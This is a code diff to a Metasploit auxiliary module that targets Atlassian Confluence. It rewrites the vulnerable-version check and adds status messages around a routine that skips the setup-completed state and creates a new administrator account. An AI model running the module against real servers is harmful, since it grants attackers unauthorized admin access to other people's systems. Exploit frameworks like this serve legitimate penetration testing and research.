@@ -49,24 +49,9 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def check
-    confluence_version = get_confluence_version
-    return Exploit::CheckCode::Unknown unless confluence_version
-
-    vprint_status("Detected Confluence version: #{confluence_version}")
-
-    unless (confluence_version < Rex::Version.new('8.3.3')) && Rex::Version.new('8.4.3') && Rex::Version.new('8.5.2')
-      return Exploit::CheckCode::Safe("Patched Confluence version #{confluence_version} detected.")
-    end
-
-    Exploit::CheckCode::Appears("Confluence version: #{confluence_version}")
-  end
-
-  def get_confluence_version
-    return @confluence_version if @confluence_version
-
     res = send_request_cgi(
       'method' => 'GET',
-      'uri' => normalize_uri(target_uri.path, '/server-info.action'),
+      'uri' => normalize_uri(target_uri.path, '/login.action'),
       'headers' => {
         'X-Atlassian-Token' => 'no-check'
       }
@@ -76,8 +61,19 @@ class MetasploitModule < Msf::Auxiliary
     poweredby = res.get_xml_document.xpath('//ul[@id="poweredby"]/li[@class="print-only"]/text()').first&.text
     return nil unless poweredby =~ /Confluence (\d+(\.\d+)*)/
 
-    @confluence_version = Rex::Version.new(Regexp.last_match(1))
-    @confluence_version
+    confluence_version = Rex::Version.new(Regexp.last_match(1))
+
+    return Exploit::CheckCode::Unknown unless confluence_version
+
+    vprint_status("Detected Confluence version: #{confluence_version}")
+
+    if confluence_version.between?(Rex::Version.new('8.0.0'), Rex::Version.new('8.3.3')) ||
+      confluence_version.between?(Rex::Version.new('8.4.0'), Rex::Version.new('8.4.3')) ||
+      confluence_version.between?(Rex::Version.new('8.5.0'), Rex::Version.new('8.5.2'))
+      return Exploit::CheckCode::Appears("Exploitable version of Confluence: #{confluence_version}")
+    end
+
+    Exploit::CheckCode::Appears("Confluence version: #{confluence_version}")
   end
 
   def run
@@ -93,6 +89,8 @@ class MetasploitModule < Msf::Auxiliary
     )
 
     return fail_with(Msf::Exploit::Failure::UnexpectedReply, 'Version vulnerable but setup is already completed') unless res&.code == 302
+
+    print_good('Found server-info.action ! Trying to ignore setup.')
 
     create_admin_user
 
@@ -128,5 +126,7 @@ class MetasploitModule < Msf::Auxiliary
     )
 
     return fail_with(Msf::Exploit::Failure::NoAccess, 'The admin user could not be created. Try a different username.') unless res&.code == 302
+
+    print_good('Setup reverted back to the beginning. Attempting to create new admin user!')
   end
 end
